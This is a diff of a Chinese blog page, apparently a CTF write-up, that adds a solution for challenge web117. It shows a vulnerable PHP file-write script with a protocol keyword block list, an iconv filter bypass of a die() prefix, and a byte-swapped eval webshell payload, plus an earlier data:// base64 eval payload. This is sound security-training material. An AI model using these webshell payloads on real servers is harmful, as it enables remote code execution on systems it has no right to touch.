@@ -625,11 +625,11 @@
       
         <div class="post-detail-header_wordcount">
           <span class="totalcount">
-            <i class="fas fa-file-text-o"></i> 字数统计: 779 |
+            <i class="fas fa-file-text-o"></i> 字数统计: 870 |
           </span>
   
           <span class="min2read">
-            <i class="fas fa-clock"></i> 阅读时长: 3分钟 |
+            <i class="fas fa-clock"></i> 阅读时长: 4分钟 |
           </span>
   
           
@@ -759,6 +759,23 @@ $content=<span class="token php language-php"><span class="token delimiter impor
 
 <p>可以发现<code>/ : ; ,</code>都没有过滤,使用data协议，记得构造编码后没有=和+（此题过滤了+)</p>
 <p><code>?file=data://text/plain;base64,PD9waHAgZXZhbCgkX0dFVFsxXSk7Pz5h</code> ==&gt; <code>&lt;?php eval($_GET[1]);?&gt;a</code></p>
+<h3 id="web117编码过滤器"><a href="#web117编码过滤器" class="headerlink" title="web117编码过滤器"></a>web117编码过滤器</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i'</span><span class="token punctuation">,</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'too young too simple sometimes naive!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$contents</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contents'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&lt;?php die();?>"</span><span class="token operator">.</span><span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>详情见上面参考链接</p>
+<p>payload:</p>
+<pre class="line-numbers language-none"><code class="language-none">GET: ?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.ucs-2be.ucs-2le&#x2F;resource&#x3D;shell.php
+
+POST: contents&#x3D;?&lt;hp pvela$(G_TE&#39;[&#39;a)] ;&gt;?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 
       </div>
       <div class="post-tags-categories">
